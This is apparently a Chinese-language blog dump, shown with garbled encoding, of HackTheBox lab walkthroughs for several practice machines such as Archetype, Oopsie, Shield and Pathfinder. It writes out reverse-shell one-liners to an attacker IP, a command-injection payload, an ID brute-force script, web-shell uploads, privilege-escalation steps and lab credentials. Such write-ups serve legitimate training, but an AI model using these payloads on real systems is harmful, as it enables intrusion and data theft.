174 README.md11/15/2020 06:20 AM 3,041,792 server.exe FTPè«åå…¶å¦™ç”¨ä¸äº† ä¼ æ–‡ä»¶åªèƒ½æ›²çº¿æ•‘å›½äº† Apache2å…è®¸PUTä½†æ˜¯ä¸èƒ½ç›´æ¥ä¸Šä¼ æ–‡ä»¶ ä¸è¿‡æ–‡ä»¶ä¼šè¿›è¡Œæµé‡ä¼ è¾“ æ‰€ä»¥å°±ç›‘å¬æµé‡ç„¶åè¿˜åŸæ–‡ä»¶ é€†å‘æ²¡é€†æ˜ç™½, åªèƒ½çœ‹Raidä¸Šçš„WPäº† å…ˆåšä¸€ä¸ªé“¾æ¥ 1mklink /j \\users\\web\\downloads\\yoloyolo \\users\\administrator\\desktop æ“æ§ç®¡é“\\\\.\\pipe\\cleanuppipe 1echo CLEAN \\users\\web\\downloads\\yoloyolo\\root.txtx &gt; \\\\.\\pipe\\cleanuppipe æ­¤æ—¶Server.exeä¼šé€šè¿‡ç®¡é“çš„å†…å®¹æ¥è¿è¡Œç¨‹åº, ä¼šå°†ç¨‹åºåŠ å¯†å¹¶ç§»åŠ¨è‡³\\programdata\\cleanup(è¿™ä¸ªç¨‹åºåº”è¯¥æ˜¯administratorè¿è¡Œçš„) åˆ æ‰é“¾æ¥, åˆ›å»ºæ–‡ä»¶å¤¹, å†è¿˜åŸæ–‡ä»¶ 123456rmdir \\users\\web\\downloads\\yoloyolomkdir \\users\\web\\downloads\\yoloyoloecho RESTORE \\users\\web\\downloads\\yoloyolo\\root.txtx &gt; \\\\.\\pipe\\cleanuppipetype \\users\\web\\downloads\\yoloyolo\\root.txtf2167014736b2934e9721962b525f674 è¿™å°æœºå­çš„å§¿åŠ¿å¤ªéªšäº† What a machine. EOF","categories":[{"name":"Study","slug":"Study","permalink":"https://yoloyolo.top/categories/Study/"}],"tags":[{"name":"Pentest","slug":"Pentest","permalink":"https://yoloyolo.top/tags/Pentest/"},{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://yoloyolo.top/tags/HackTheBox/"},{"name":"Windows","slug":"Windows","permalink":"https://yoloyolo.top/tags/Windows/"}]},{"title":"HackTheBox_Start_Point","slug":"HackTheBox-Start-Point","date":"2021-06-04T16:26:01.000Z","updated":"2023-02-14T15:32:40.000Z","comments":true,"path":"2021/06/04/HackTheBox-Start-Point/","link":"","permalink":"https://yoloyolo.top/2021/06/04/HackTheBox-Start-Point/","excerpt":"å€Ÿç€HTBå¤šå­¦ä¸€äº›Windowsä¸‹çš„æ¸—é€æŠ€å·§","text":"å€Ÿç€HTBå¤šå­¦ä¸€äº›Windowsä¸‹çš„æ¸—é€æŠ€å·§ HackTheBox_Archetype Windows ç«¯å£æ‰«æ 1234567891011nmap -sV -sT -Pn 10.10.10.27Nmap scan report for 10.10.10.27Host is up (0.51s latency).Not shown: 996 closed portsPORT STATE SERVICE VERSION135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows æ¼æ´åˆ©ç”¨ ç”¨smbmapå…ˆæ‰«æä¸€æ³¢SMBæœåŠ¡ 12smbmap -H 10.10.10.27[+] IP: 10.10.10.27:445 Name: 10.10.10.27 éšä¾¿åŠ ä¸ªç”¨æˆ·å 12345678smbmap -H 10.10.10.27 -u test[+] Guest session IP: 10.10.10.27:445 Name: 10.10.10.27 Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin backups READ ONLY C$ NO ACCESS Default share IPC$ READ ONLY Remote IPC ç©ºå¯†ç å³å¯ç™»å…¥ 1234567891011smbclient \\\\\\\\10.10.10.27\\\\backups -U testEnter WORKGROUP\\test&#x27;s password: Try &quot;help&quot; to get a list of possible commands.smb: \\&gt; dir . D 0 Fri Jun 4 12:10:59 2021 .. D 0 Fri Jun 4 12:10:59 2021 prod.dtsConfig AR 609 Mon Jan 20 20:23:02 2020 schtasks.txt A 174006 Fri Jun 4 12:05:57 2021 services.txt A 6370 Fri Jun 4 12:10:59 2021 10328063 blocks of size 4096. 8165400 blocks available 12smb: \\&gt; get prod.dtsConfiggetting file \\prod.dtsConfig of size 609 as prod.dtsConfig (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec) 12345678&lt;DTSConfiguration&gt; &lt;DTSConfigurationHeading&gt; &lt;DTSConfigurationFileInfo GeneratedBy=&quot;...&quot; GeneratedFromPackageName=&quot;...&quot; GeneratedFromPackageID=&quot;...&quot; GeneratedDate=&quot;20.1.2019 10:01:34&quot;/&gt;&quot;/&gt; &lt;/DTSConfigurationHeading&gt; &lt;Configuration ConfiguredType=&quot;Property&quot; Path=&quot;\\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType=&quot;String&quot;&gt; &lt;ConfiguredValue&gt;Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt; &lt;/Configuration&gt;&lt;/DTSConfiguration&gt; å¾—åˆ°MSSQLè´¦æˆ·ARCHETYPE\\sql_svc:M3g4c0rp123 è¿™é‡Œä½¿ç”¨impacketæ¥ç™»å…¥ https://github.com/SecureAuthCorp/impacket å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ 123456789101112131415161718192021222324252627282930python mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-authImpacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth CorporationPassword:[*] Encryption required, switching to TLS[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192[*] INFO(ARCHETYPE): Line 1: Changed database context to &#x27;master&#x27;.[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commandsSQL&gt; enable_xp_cmdshell[*] INFO(ARCHETYPE): Line 185: Configuration option &#x27;show advanced options&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.[*] INFO(ARCHETYPE): Line 185: Configuration option &#x27;xp_cmdshell&#x27; changed from 0 to 1. Run the RECONFIGURE statement to install.SQL&gt; xp_cmdshell whoamioutput -------------------------------------------------------------------------------- archetype\\sql_svc NULL SQL&gt; xp_cmdshell type C:\\users\\sql_svc\\desktop\\user.txtoutput -------------------------------------------------------------------------------- 3e7b102e78218e935bf3f4951fec21a3 æƒé™æå‡ C:\\users\\sql_svc\\appdataä¸ºéšè—è·¯å¾„, éœ€è¦ä½¿ç”¨dir /a 12345678910SQL&gt; xp_cmdshell type C:\\users\\sql_svc\\appdata\\roaming\\microsoft\\windows\\powershell\\psreadline\\ConsoleHost_history.txtoutput -------------------------------------------------------------------------------- net.exe use T: \\\\Archetype\\backups /user:administrator MEGACORP_4dm1n!! exit NULL é€šè¿‡æŸ¥çœ‹powershellçš„å†å²è®°å½•å¾—åˆ°administratorçš„è´¦æˆ· Archetype\\administrator:MEGACORP_4dm1n!! åœ¨ä½¿ç”¨impacketä¸­çš„psexec.pyæ¥å¾—åˆ°ç®¡ç†å‘˜æƒé™çš„Shell 12345678910111213141516python psexec.py archetype/administrator@10.10.10.27Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth CorporationPassword:[*] Requesting shares on 10.10.10.27.....[*] Found writable share ADMIN$[*] Uploading file OFvCNrQJ.exe[*] Opening SVCManager on 10.10.10.27.....[*] Creating service SMtb on 10.10.10.27.....[*] Starting service SMtb.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17763.107](c) 2018 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&gt;type C:\\users\\administrator\\desktop\\root.txtb91ccec3305e98240082d4474b848528 å°è¯•ä¸ä½¿ç”¨psexecè¿è¡Œç®¡ç†å‘˜æƒé™å‘½ä»¤çš„ä¸€æ³¢ä¸‰æŠ˜ Windowsä¸‹å¯ä»¥ä½¿ç”¨runaså‘½ä»¤æ¥ä»¥å…¶ä»–ç”¨æˆ·çš„èº«ä»½è¿è¡Œå‘½ä»¤ å¦‚runas /savecred /user:administrator whoami ä½†æ˜¯ä¸èƒ½ç›´æ¥é€šè¿‡å‚æ•°è¾“å…¥å¯†ç  123runas /savecred /user:administrator whoamiè¯•å›¾å°† whoami ä½œä¸ºç”¨æˆ· &quot;DOMAIN\\administrator&quot; å¯åŠ¨...è¾“å…¥ administrator çš„å¯†ç : å¯†ç çš„è¾“å…¥éœ€è¦ä»¥äº¤äº’å¼çš„æ–¹å¼æ¥è¾“å…¥, å°±æ— æ³•åœ¨MSSQLçš„éäº¤äº’å¼Shellä¸­ç›´æ¥ææƒ è€Œå¯ä»¥ä½¿ç”¨sanurè¿™ä¸ªå·¥å…·æ¥è¿›è¡Œå¯†ç çš„å‘½ä»¤è¡Œè¾“å…¥ 1runas /savecred /user:administrator whoami | sanur.exe password ä½†æ˜¯ç´§æ¥ç€é—®é¢˜åˆæ¥äº† runasè²Œä¼¼ä¸ä¼šåœ¨å½“å‰cmdçª—å£è¿è¡Œå‘½ä»¤è€Œæ˜¯åœ¨ä¸€ä¸ªæ–°çš„cmdä¸­è¿è¡Œ, è¿™æ ·çš„è¯å°±ä¸èƒ½åœ¨MSSQLçš„Shellä¸­çœ‹åˆ°å›æ˜¾ æ‰€ä»¥å°è¯•äº†æ–‡ä»¶å†™å…¥ä¿å­˜å‘½ä»¤è¿è¡Œç»“æœçš„æ–¹æ³• 1runas /savecred /user:administrator &quot;cmd /c whoami &gt; C:\\1&quot; | sanur.exe password æœ¬åœ°è¿è¡ŒæˆåŠŸäº†, ä½†æ˜¯ç›®æ ‡æœºå™¨ä¸è¡Œ(æ— å¥ˆ) HackTheBox_Oopsie Linux ç«¯å£æ‰«æ 123456789nmap -sV -sT -Pn 10.10.10.28Nmap scan report for 10.10.10.28Host is up (0.68s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.29 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel æ¼æ´åˆ©ç”¨ åœ¨é¦–é¡µçš„æºç çœ‹åˆ°è¿™æ ·ä¸€æ¡JS 1&lt;script src=&quot;/cdn-cgi/login/script.js&quot;&gt;&lt;/script&gt; å¾—åˆ°è·¯å¾„/cdn-cgi/login è®¿é—®è¯¥è·¯å¾„å³ä¸ºç™»å…¥é¡µé¢ è¿™é‡Œçš„ç™»å…¥éœ€è¦ä½¿ç”¨ä¸Šä¸€å°é¶æœºçš„Administratorå¯†ç , æœ‰ç‚¹å‘ admin:MEGACORP_4dm1n!! è®¿é—®/cdn-cgi/login/admin.php?content=uploads æç¤ºThis action require super admin rights. ä¸”Cookieä¸­çš„å†…å®¹ä¸ºuser=34322; role=admin é‚£ä¹ˆåªè¦èƒ½å¤Ÿå¾—åˆ°super adminçš„idå€¼ä¸usernameå³å¯è¶Šæƒ /cdn-cgi/login/admin.php?content=accounts&amp;id=1 è®¿é—®è¯¥è·¯å¾„å¯ä»¥å¾—åˆ°adminçš„è´¦æˆ·ä¿¡æ¯ å¯ä»¥é€šè¿‡çˆ†ç ´å‚æ•°idæ¥å¾—åˆ°super adminçš„ä¿¡æ¯ 12345678910import reimport requestsreq = requests.session()headers = &#123;&quot;Cookie&quot;:&quot;user=34322; role=admin&quot;&#125;for _ in range(0, 999): url = &quot;http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&amp;id=&#123;&#125;&quot;.format(_) res = req.get(url, headers = headers) if &quot;super&quot; in res.text: print(_) exit() idä¸º30, å¾—åˆ°å¦‚ä¸‹ä¿¡æ¯ 12Access ID Name Email86575 super admin superadmin@megacorp.com é€šè¿‡åœ¨Burpsuiteä¸­ä¿®æ”¹Cookieä¸ºCookie: user=86575; role=super adminæ¥è®¿é—®/cdn-cgi/login/admin.php?content=uploads ä¸Šä¼ weevelyçš„Shellå³å¯è·å¾—æƒé™ æƒé™æå‡ ä½¿ç”¨pythonåå¼¹Shellåˆ°æœ¬æœº 123python3 -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;10.10.16.51&#x27;,9996));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;-------nc -lvnp 9996 è·å¾—tty (å¥½åƒæ˜¯ç”¨äºè·å–ä¸€ä¸ªç»ˆç«¯ä¼šè¯, å¦åˆ™åç»­çš„åˆ‡æ¢ç”¨æˆ·æ“ä½œæ— æ³•è¿›è¡Œ) 1python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; ä¹‹å‰æŸ¥çœ‹ç”¨æˆ·ä¿¡æ¯çš„é¡µé¢åº”è¯¥ç”¨åˆ°äº†SQLçš„æ“ä½œ é‚£ä¹ˆå°±å¯ä»¥å»æ‰¾SQLçš„é…ç½®ä¿¡æ¯ 1234567cat /var/www/html/cdn-cgi/login/db.php&lt;i/login$ cat cat /var/www/html/cdn-cgi/login/db.phpcat: cat: No such file or directory&lt;?php$conn = mysqli_connect(&#x27;localhost&#x27;,&#x27;robert&#x27;,&#x27;M3g4C0rpUs3r!&#x27;,&#x27;garage&#x27;);?&gt; å¾—åˆ°è´¦æˆ·ä¿¡æ¯robert:M3g4C0rpUs3r! ä½¿ç”¨è¯¥è´¦æˆ·ä¿¡æ¯åˆ‡æ¢åˆ°ç”¨æˆ·robert 12345su robertM3g4C0rpUs3r!cat /home/robert/user.txtf2c74ee8db7983851ab2a96a44eb7981 æŸ¥æ‰¾æœ‰SUIDæƒé™çš„æ–‡ä»¶ 1find / -user root -perm -4000 -print 2&gt;/dev/null çœ‹åˆ°ä¸€ä¸ªæœ‰æ„æ€çš„æ–‡ä»¶ 1/usr/bin/bugtracker è€Œè¯¥ç”¨æˆ·ä¹Ÿæœ‰è¿è¡Œæƒé™ 12345ls -la /usr/bin/bugtracker-rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtrackeriduid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker) IDAä¸­åˆ†æ 12345678910111213141516171819int __cdecl main(int argc, const char **argv, const char **envp)&#123; __uid_t v3; // eax const char *v4; // rax char v7[24]; // [rsp+10h] [rbp-20h] BYREF unsigned __int64 v8; // [rsp+28h] [rbp-8h] v8 = __readfsqword(0x28u); printf(&quot;%s&quot;, &quot;\\n------------------\\n: EV Bug Tracker :\\n------------------\\n\\n&quot;); printf(&quot;Provide Bug ID: &quot;); __isoc99_scanf(&quot;%s&quot;, v7); printf(&quot;%s&quot;, &quot;---------------\\n\\n&quot;); v3 = geteuid(); setuid(v3); v4 = (const char *)concat(&quot;cat /root/reports/&quot;, v7); system(v4); putchar(10); return __readfsqword(0x28u) ^ v8;&#125; ç”¨æˆ·è¾“å…¥v7 v7è¢«æ‹¼æ¥åˆ°&quot;cat /root/reports/&quot;ä¹‹ååœ¨èµ‹å€¼ç»™v4 æ‰§è¡Œv4 å‘½ä»¤æ³¨å…¥ Payload: ;cat$IFS$9/root/root.txt 1234567891011./bugtracker------------------: EV Bug Tracker :------------------Provide Bug ID: ;cat$IFS$9/root/root.txt---------------cat: /root/reports/: Is a directoryaf13b0bee69f8a877c3faf667f7beacf HackTheBox_Archetype Linux ç«¯å£æ‰«æ 12345678910nmap -sV -sT -Pn 10.10.10.46Nmap scan report for 10.10.10.46Host is up (0.59s latency).Not shown: 997 closed portsPORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel æ¼æ´åˆ©ç”¨ The credentials ftpuser / mc@F1l3ZilL4 can be used to login to the FTP server. â€“ å®˜æ–¹WP å°è¯•ä½¿ç”¨ä¸Šå°é¶æœºä¸­è·å–çš„ftpå‡­æ®ftpuser/mc@F1l3ZilL4ç™»å½•é¶æœºçš„ftpæœåŠ¡ https://blog.csdn.net/qianxiaoyiran311/article/details/105988795 å¾—åˆ°FTPè´¦æˆ· 1ftpuser:mc@F1l3ZilL4 ç™»å…¥FTPæœåŠ¡ 1234567891011121314151617181920ftp 10.10.10.46Connected to 10.10.10.46.220 (vsFTPd 3.0.3)Name (10.10.10.46:root): ftpuser331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls200 PORT command successful. Consider using PASV.150 Here comes the directory listing.-rw-r--r-- 1 0 0 2533 Feb 03 2020 backup.zip226 Directory send OK.ftp&gt; get backup.ziplocal: backup.zip remote: backup.zip200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for backup.zip (2533 bytes).226 Transfer complete.2533 bytes received in 0.23 secs (10.7549 kB/s) çˆ†ç ´åŠ å¯†å‹ç¼©åŒ…backup.zip 123fcrackzip backup.zip -D -p &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -uPASSWORD FOUND!!!!: pw &#x3D;&#x3D; 741852963 æŸ¥çœ‹index.php 123456789&lt;?phpsession_start(); if(isset($_POST[&#x27;username&#x27;]) &amp;&amp; isset($_POST[&#x27;password&#x27;])) &#123; if($_POST[&#x27;username&#x27;] === &#x27;admin&#x27; &amp;&amp; md5($_POST[&#x27;password&#x27;]) === &quot;2cb42f8734ea607eefed3b70af13bbd3&quot;) &#123; $_SESSION[&#x27;login&#x27;] = &quot;true&quot;; header(&quot;Location: dashboard.php&quot;); &#125; &#125;?&gt; çˆ†ç ´Hash 12345678910echo -n &quot;2cb42f8734ea607eefed3b70af13bbd3&quot; &gt; passwdjohn --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt passwdUsing default input encoding: UTF-8Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])Warning: no OpenMP support for this hash type, consider --fork=2Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statusqwerty789 (?)1g 0:00:00:00 DONE (2021-06-05 19:16) 33.33g/s 3340Kp/s 3340Kc/s 3340KC/s shunda..pogimoUse the &quot;--show --format=Raw-MD5&quot; options to display all of the cracked passwords reliablySession complete ç™»å…¥Webé¡µé¢, çœ‹åˆ°ä¸€ä¸ªæœç´¢åŠŸèƒ½ ä½¿ç”¨sqlmapæ¥getshell 1sqlmap -u &quot;http://10.10.10.46/dashboard.php?search=1&quot; --os-shell sqlmapç»™å‡ºçš„shellä¸æ˜¯å¾ˆå¥½ç”¨, è‡ªå·±å†å¼¹ä¸ªShell 123rm /tmp/y;mkfifo /tmp/y;cat /tmp/y|/bin/bash -i 2&gt;&amp;1|nc 10.10.16.51 9996 &gt;/tmp/y------nc -lvnp 9996 æƒé™æå‡ æŸ¥çœ‹æ•°æ®åº“ä¿¡æ¯ 123cat /var/www/html/dashboard.php$conn = pg_connect(&quot;host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!&quot;); å¾—åˆ°è´¦æˆ· 1postgres:P@s5w0rd! SSHç™»å…¥ 12ssh postgres@10.10.10.46P@s5w0rd! æŸ¥çœ‹sudoæƒé™ 123456789sudo -l[sudo] password for postgres: P@s5w0rd!Matching Defaults entries for postgres on vaccine: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser postgres may run the following commands on vaccine: (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf viææƒ 12/bin/vi /etc/postgresql/11/main/pg_hba.conf:shell 12cat /root/root.txtdd6e058e814260bc70e9bbdef2715849 æ¥è‡ªä¸Šä¸€å°é¶æœºçš„FTPè´¦æˆ· æœ¬ç€å®è·µå‡ºçœŸçŸ¥çš„ç²¾ç¥, å†çœ‹äº†ä¸€ä¸‹ä¸Šä¸€å°é¶æœºOopsieçš„ç«¯å£å¼€æ”¾æƒ…å†µ 123456789netstat -antlpProto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN 1205/mysqld tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN 800/systemd-resolve tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 1120/sshd tcp 0 235 10.10.10.28:41042 10.10.16.51:9996 ESTABLISHED 2166/python3 tcp6 0 0 :::80 :::* LISTEN 1260/apache2 tcp6 0 0 :::22 :::* LISTEN 1120/sshd tcp6 0 0 10.10.10.28:80 10.10.16.51:58936 ESTABLISHED 1963/apache2 å¹¶æ²¡æœ‰FTPæœåŠ¡, é‚£ä¹ˆå°±æ˜¯å¯èƒ½è¿™ç§é¶æœºé¡ºåºå…³ç³»çš„å˜æ›´ æˆ‘ä¸ªäººä¸æ˜¯å¾ˆè®¤åŒè¿™ç§æŠŠæ•æ„Ÿä¿¡æ¯æ”¾åœ¨å…¶ä»–é¶æœºæ³„éœ²çš„è®¾è®¡ ç¡®åˆ‡æ¥è¯´, ä¸åº”è¯¥æŠŠè¿™ç§é€šè¿‡å…¶ä»–é¶æœºæ³„éœ²æ•æ„Ÿä¿¡æ¯ä½œä¸ºå”¯ä¸€çš„æ”»å‡»é“¾ åœ¨ç»™å‡ºè¿™æ ·çš„ä¸€æ¡æ”»å‡»é“¾çš„æ—¶å€™åº”è¯¥å†ç»™å‡ºå¦å¤–ä¸€ä¸ªæ”»å‡»é“¾ è™½ç„¶è¿™æ ·çš„ç¡®èƒ½å¤Ÿå¯¹äºè¿ç»­çš„é¶æœºæ¸—é€, æˆ–è€…è¯´å¤šå±‚é¶æœºæ¸—é€çš„å¸¦æ¥æ›´åŠ è´¯é€šçš„ä½“éªŒ ä½†æ˜¯å‡ºç°äº†è¿™ç§é¡ºåºå˜æ›´çš„æƒ…å†µä¹‹åå°±ä¼šæ˜¾å¾—ååˆ†å¼„å·§æˆæ‹™, è€Œä¸”æ²¡æœ‰åº”æœ‰çš„åç»­ä¿®æ”¹ æ²¡æœ‰user.txtä¹Ÿåªæ˜¯ç»™è¿™å°æœºå™¨çš„2.7åˆ†é”¦ä¸Šæ·»èŠ±äº† HackTheBox_Shield Windows ç«¯å£æ‰«æ 123456789nmap -sV -sT -Pn 10.10.10.29Nmap scan report for 10.10.10.29Host is up (0.38s latency).Not shown: 998 filtered portsPORT STATE SERVICE VERSION80/tcp open http Microsoft IIS httpd 10.03306/tcp open mysql MySQL (unauthorized)Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows è·¯å¾„æ‰«æ æ‰«æåˆ°è·¯å¾„/wordpress å…¶å®æ ¹æœ¬æ²¡æ‰«, ç½‘ç»œç¯å¢ƒå¤ªå·®äº†, ç›´æ¥çœ‹WPçš„ æ¼æ´åˆ©ç”¨ 123456789wpscan --url http://10.10.10.29/wordpress/ -e u[+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://10.10.10.29/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) ä½¿ç”¨ä¸Šä¸€å°é¶æœºçš„å¯†ç P@s5w0rd! å¾—åˆ°è´¦æˆ·admin:P@s5w0rd! æ‹³å¤´ç¡¬äº† ç™»å…¥ä¹‹åä¿®æ”¹æ’ä»¶çš„ä»£ç  ç›´æ¥å†™ä¸ªShellè¿›å» ç„¶åè®¿é—®/wordpress/wp-content/plugins/mesmerize-companion/src/Companion.phpå³å¯ æƒé™æå‡ èšå‰‘è¿WebShell ä¸Šä¼ ncå†å¼¹Shellå›æ¥ 123nc64.exe -e C:\\windows\\system32\\cmd.exe 10.10.16.51 9996-------nc -lvnp 9996 12345678910111213141516171819202122232425262728293031323334353637383940414243systeminfoHost Name: SHIELDOS Name: Microsoft Windows Server 2016 StandardOS Version: 10.0.14393 N/A Build 14393OS Manufacturer: Microsoft CorporationOS Configuration: Member ServerOS Build Type: Multiprocessor FreeRegistered Owner: Windows UserRegistered Organization: Product ID: 00376-30000-00299-AA303Original Install Date: 2/4/2020, 12:58:01 PMSystem Boot Time: 6/5/2021, 8:21:33 PMSystem Manufacturer: VMware, Inc.System Model: VMware7,1System Type: x64-based PCProcessor(s): 1 Processor(s) Installed. [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 MhzBIOS Version: VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019Windows Directory: C:\\WindowsSystem Directory: C:\\Windows\\system32Boot Device: \\Device\\HarddiskVolume2System Locale: en-us;English (United States)Input Locale: en-us;English (United States)Time Zone: (UTC-08:00) Pacific Time (US &amp; Canada)Total Physical Memory: 2,047 MBAvailable Physical Memory: 753 MBVirtual Memory: Max Size: 2,431 MBVirtual Memory: Available: 1,015 MBVirtual Memory: In Use: 1,416 MBPage File Location(s): C:\\pagefile.sysDomain: MEGACORP.LOCALLogon Server: N/AHotfix(s): N/ANetwork Card(s): 1 NIC(s) Installed. [01]: vmxnet3 Ethernet Adapter Connection Name: Ethernet0 2 DHCP Enabled: No IP address(es) [01]: 10.10.10.29 [02]: fe80::98f9:2cd0:ff27:3fbc [03]: dead:beef::98f9:2cd0:ff27:3fbcHyper-V Requirements: A hypervisor has been detected. Features required for Hyper-V will not be displayed. æ²¡æœ‰æ‰“è¡¥ä¸çš„Windows Server 2016 Standard ç”¨çƒ‚åœŸè±†ææƒ https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe å†™ä¸€ä¸ªåå¼¹Shellçš„batè„šæœ¬ 1echo start C:\\temp\\nc64.exe -e cmd.exe 10.10.16.51 9995 &gt; C:\\temp\\shell.bat å½“æ—¶å› ä¸ºç”¨linuxçš„ä¹ æƒ¯å°±ç”¨äº†åŒå¼•å·æŠŠè¦å†™å…¥çš„å†…å®¹æ‹¬äº†èµ·æ¥, ä½†æ˜¯Windowsä¼šå¾ˆè›‹ç–¼å¾—æŠŠåŒå¼•å·ä¹Ÿå†™å…¥, ç„¶åå°±å¯¼è‡´äº†å½“æ—¶ä¸€ç›´ä¸èƒ½ææƒ çœ‹ä¸€ä¸‹æƒé™ 12345678910whoami /privPRIVILEGES INFORMATION----------------------Privilege Name Description State ======================= ========================================= =======SeChangeNotifyPrivilege Bypass traverse checking EnabledSeImpersonatePrivilege Impersonate a client after authentication EnabledSeCreateGlobalPrivilege Create global objects Enabled å¦‚æœå¼€å¯SeImpersonateæƒé™ï¼Œjuicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨-t t å¦‚æœå¼€å¯SeAssignPrimaryTokenæƒé™ï¼Œjuicypotatoçš„å‚æ•°å¯ä»¥ä½¿ç”¨-t u å¦‚æœå‡å¼€å¯ï¼Œå¯ä»¥é€‰æ‹©-t * å¦‚æœå‡æœªå¼€å¯ï¼Œé‚£ä¹ˆæ— æ³•ææƒ https://blog.csdn.net/god_zzZ/article/details/106334702 ç„¶ååœ¨é¡¹ç›®ä¸Šæ‰¾ä¸€ä¸ªWindows Server 2016 Standardçš„CLSID 123JuicyPotato.exe -t t -p C:\\temp\\shell.bat -l 6666 -c &#123;F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4&#125;------nc -lvnp 9995 12type c:\\users\\administrator\\desktop\\root.txt6e9a9fdc6f64e410a68b847bb4b404fa HackTheBox_Pathfinder å¯¹äºåŸŸæ§çš„æ”»å‡»æœ‰ç‚¹è¶…å‡ºçš„æˆ‘çš„çŸ¥è¯†èŒƒå›´äº† ç«¯å£æ‰«æ 1234567891011121314151617181920nmap -sV -sT -p 1-10000 10.10.10.30Nmap scan report for 10.10.10.30Host is up (0.57s latency).Not shown: 9987 closed portsPORT STATE SERVICE VERSION53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-06-08 13:22:07Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)9389/tcp open mc-nmf .NET Message FramingService Info: Host: PATHFINDER; OS: Windows; CPE: cpe:/o:microsoft:windows ä½¿ç”¨ä¸Šä¸€å°é¶æœºçš„å‡­è¯sandra:Password1234!æ¥æšä¸¾ADçš„ä¿¡æ¯ â€“ å®˜æ–¹WP 1bloodhound-python -d megacorp.local -u sandra -p &quot;Password1234!&quot; -gc pathfinder.megacorp.local -c all -ns 10.10.10.30 12neo4j consolebloodhound jsonæ‰“åŒ…ä¸ºzipåæ”¾è¿›bloodhound è‡ªå·±ç”¨åœ¨kaliç”¨bloodhoundçš„æ—¶å€™æ€»æ˜¯è«åå…¶å¦™çš„å´©æºƒ, åªèƒ½åœ¨windowsä¸Šä½¿ç”¨äº† 